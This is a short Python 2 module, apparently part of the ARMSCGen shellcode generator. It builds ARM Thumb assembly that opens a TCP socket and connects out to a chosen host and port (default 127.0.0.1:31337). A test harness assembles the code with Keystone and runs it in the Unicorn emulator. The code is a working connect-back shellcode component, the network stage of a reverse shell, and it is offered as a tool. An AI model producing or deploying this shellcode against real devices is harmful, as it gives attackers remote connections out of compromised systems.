from socket import htons, inet_aton, gethostbyname
from struct import unpack

def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337):
    """Connects to remote machine on specific port

    Args:
        host(str): hostname or IP address

        port(int/str): specific port
    """

    sc = """
    movs r0, #2
    movs r1, #1
    subs r2, r2, r2
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #26
    svc 1
    #adr r1, sockaddr_1
    mov r1, pc
    adds r1, #12
    movs r2, #16
    movs r3, #2
    mov r6, r0
    strh r3, [r1]
    b after_sockaddr_2
    subs r1, r1, r1

sockaddr_1:
    .short 0x4141
    .short %s
    .word  %s
    
after_sockaddr_2:
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #28
    svc 1
    """ % (htons(int(port)), u32(binary_ip(host)))
    return sc

def testcase(host='127.0.0.1', port=31337):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('thumb', generate(host, port))[0]
    sclen = len(sc)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
